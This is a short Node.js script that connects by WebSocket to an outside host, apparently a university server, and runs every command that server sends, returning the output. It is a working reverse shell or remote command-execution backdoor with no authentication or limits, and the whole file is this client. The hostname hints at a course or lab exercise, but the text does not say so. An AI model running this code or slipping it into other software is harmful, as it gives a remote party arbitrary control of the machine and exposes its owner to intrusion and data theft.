const { spawnSync } = require("child_process");
const { client: WebSocketClient } = require("websocket");

const client = new WebSocketClient();

client.on("connect", connection => {
  connection.on("message", message => {
    if (message.type !== "utf8") {
      return;
    }
    const [cmd, args] = JSON.parse(message.utf8Data);
    const output = spawnSync(cmd, args);
    connection.sendUTF(
      JSON.stringify({
        error: output.error && output.error.message,
        stdout: output.stdout && output.stdout.toString(),
        stderr: output.stderr && output.stderr.toString()
      })
    );
  });
});

client.connect(
  "ws://lgtm.hermod.cs-campus.fr/",
  "echo-protocol"
);
